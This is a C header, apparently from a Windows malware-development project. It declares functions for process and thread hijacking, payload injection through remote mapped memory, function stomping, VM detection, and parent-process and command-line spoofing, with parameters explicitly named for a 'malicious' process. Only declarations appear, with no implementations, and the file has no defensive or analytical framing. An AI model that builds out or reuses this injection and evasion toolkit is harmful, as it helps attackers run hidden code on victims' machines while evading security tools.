#pragma once
#include <Windows.h>
#include <Psapi.h>
#include <stdlib.h>
#include <TlHelp32.h>
#include "Encryption.h"
#include "Win32FindDataArray.h"
#include <setupAPI.h>
#include <winternl.h>

#include "resource.h"

typedef NTSTATUS(NTAPI* fnNtQuerySystemInformation)
(
	SYSTEM_INFORMATION_CLASS SystemInformationClass,
	PVOID                    SystemInformation,
	ULONG                    SystemInformationLength,
	PULONG                   ReturnLength
);

__kernel_entry NTSTATUS NTQuerySystemInformation
(
	IN              SYSTEM_INFORMATION_CLASS SystemInfomaionClass,
	IN OUT          PVOID                    SystemInformation,
	IN              ULONG                    SystemInformationLength,
	   OUT OPTIONAL PULONG                   ReturnLength
);

typedef NTSTATUS (NTAPI  *fnNTQueryProcessInformation)
(
	IN              HANDLE           ProcessHandle,
	IN              PROCESSINFOCLASS ProcessInformationClass,
	   OUT          PVOID            ProcessInformation,
	IN              ULONG            ProcessInformationLength,
	   OUT OPTIONAL PULONG           ReturnLength
);

__kernel_entry NTSTATUS NTQueryProcessInformation
(
	IN              HANDLE           ProcessHandle,
	IN              PROCESSINFOCLASS ProcessInformationClass,
	   OUT          PVOID            ProcessInformation,
	IN              ULONG            ProcessInformationLength,
	   OUT OPTIONAL PULONG           ReturnLength
);


typedef struct _RESOURCE
{
	PVOID  pAddress;
	size_t sSize;

}RESOURCE, * PRESOURCE;

BOOLEAN CreateDebuggedProcess
(
	IN     PCHAR   pProcessName,
	   OUT PDWORD  pdwProcessId,
	   OUT PHANDLE phProcessHandle,
	   OUT PHANDLE phThreadHandle
);

BOOLEAN CreateSuspendedProcess
(
	IN     PSTR    pProcessName,
	   OUT PDWORD  pdwProcessId,
	   OUT PHANDLE phProcessHandle,
	   OUT PHANDLE phThreadHandle
);

BOOLEAN CreateSacrificialThread
(
	   OUT PDWORD  pdwSacrificialThreadId,
	   OUT PHANDLE phThreadHandle
);

BOOLEAN HijackThread
(
	IN     HANDLE hThread,
	IN     PUCHAR pPayloadAddress
);

BOOLEAN HijackLocalThread
(
	IN     HANDLE hThread,
	IN     PUCHAR pPayloadAdress,
	IN     SIZE_T sPayloadSize
);

INT8 CheckVM
(
	IN     void
);

BOOLEAN FetchAlertableThread
(
	IN     DWORD   dwMainThreadId,
	IN     DWORD   dwTargetPID,
	   OUT PDWORD  pdwAlertedThreadId,
	   OUT PHANDLE phAlertedThreadHandle
);

BOOLEAN FetchLocalThreadHandle
(
	IN     DWORD   dwMainThreadId,
	   OUT PDWORD  pdwTargetThreadId,
	   OUT PHANDLE phThreadHandle
);

BOOLEAN FetchRemoteThreadHandle
(
	IN     DWORD   dwProcessId,
	   OUT PDWORD  pdwThreadId,
	   OUT PHANDLE phThreadHandle
);

BOOLEAN FetchResource
(
	   OUT PRESOURCE pResource_t
);

BOOLEAN FetchDrives
(
	IN OUT LPWSTR pPath
);
HMODULE GetModuleHandleReplacement
(
	IN    LPWSTR lpwTargetModuleName
);

BOOLEAN FetchProcessHandleHelpTool32
(
	IN	   LPWSTR  pwTargetProcessName,
	IN     PDWORD  pdwProcessId,
	   OUT PHANDLE phTargetProcessHandleAddress
);

BOOLEAN FetchProcessHandleEnumProcesses
(
	IN     LPWSTR    lpTagetProcessName,
	   OUT PDWORD    pdwTargetProcessId,
	   OUT HANDLE   *phTargetProcessHandle
);

BOOLEAN FetchProcessHandleNtQuerySystemInformation
(
	IN     LPCWSTR szProcName,
	   OUT PDWORD pdwPid,
	   OUT PHANDLE phProcess
);

LPWIN32_FIND_DATA_ARRAYW FetchFileArrayW
(
	IN     LPWSTR pPath
);

LPWIN32_FIND_DATA_ARRAYW RefetchFilesArrayW
(
    IN     LPWSTR pPath,
    IN OUT LPWIN32_FIND_DATA_ARRAYW pFiles_arr_t
);
VOID TestAllertAbleThread
(
	HANDLE hAlertableThreadHandle
);

HANDLE CreateVessel
(
	IN     LPWSTR pPath
);

BOOLEAN MapLocalMemory
(
	IN     PUCHAR  pPayload,
	   OUT PUCHAR *pMappedAddress,
	   OUT SIZE_T  sPayloadSize,
	   OUT PHANDLE phFileMappingHandle 
);

BOOLEAN InjectPayloadRemoteMappedMemory
(
	IN     PUCHAR  pPayload,
	   OUT PUCHAR *pRemoteMappedAddress,
	   OUT PUCHAR *pLocalMappedAddress,
	IN	   SIZE_T  sPayloadSize,
	   OUT PHANDLE phRemoteFileMappingHandle,
	IN     HANDLE  hProcess
);

BOOL FetchStompingTarget
(
	IN     LPSTR  pSacrificialDllName,
	IN     LPSTR  pSacrificialFuncName,
	   OUT PVOID *pTargetFunctionAddress
);
UCHAR FetchImageHeaders
(
	IN     HANDLE hTargetProcess,
	   OUT PPEB  *pPEB
);

FARPROC GetProcessAddressReplacement
(
	IN     HMODULE Target_hModule,
	IN     LPSTR   lpTargetApiName
);

BOOLEAN SpoofParentProcessId
(
	IN     LPSTR   pMaliciousProcessName, 
	IN     HANDLE  hSpoofedParentProcessHandle, //a HANDLE is a datatype used by the WinAPI to handle i.e. Interact with objects (files, processes, threads, consoles, windows, etc..)
	   OUT PDWORD  pdwMaliciousProcessPID,
	   OUT PHANDLE phMaliciousProcessHandle,
	   OUT PDWORD  pdwMaliciousThreadId,
	   OUT PHANDLE phMaliciousThreadHandle
);

BOOLEAN SpoofCommandLineArguments
(
	IN     LPWSTR  pSpoofedCommandLine,
	IN	   LPWSTR  pMaliciousCommandLine,
	IN     DWORD   dwSpoofedcmdLineLength,
	   OUT PHANDLE phProcessHandle,
	   OUT PDWORD  pdwProcessId,
	   OUT PHANDLE phThreadHandle,
	   OUT PDWORD  pdwThreadId
);

BOOLEAN SpoofProcessCLA_PPID //CLA = Command Line Argument | PPID = Parent Process IDentifier
(
	IN	    LPWSTR  pSpoofedCommandLine,
	IN      HANDLE  hSpoofedParentProcessHandle,
	IN      LPWSTR  pMaliciousCommandLine,
	IN      DWORD   dwExposedCommandLineLength,
	IN      PCH    pTargetSpoofedPathName,
	   OUT 	PHANDLE phMaliciousProcessHandle,
	   OUT  PDWORD  pdwMaliciousProcessId,
	   OUT	PHANDLE phMalicousThreadHandle,
	   OUT  PDWORD  pdwMaliciousThreadId 
);

BOOLEAN ReadStructureFromProcess
(
	IN     HANDLE hTargetProcess, 
	IN     PVOID  pPEBBaseAddress, 
	   OUT PVOID *pReadBufferAddress, 
	IN     DWORD  dwBufferSize,
	IN     HANDLE hHeap
);

BOOLEAN WriteToTargetProcessEnvironmentBlock
(
	IN      HANDLE hProcess,
	IN      PVOID pAddressToWriteTo,
	IN      PVOID pBuffer,
	IN      DWORD dwBufferSize
);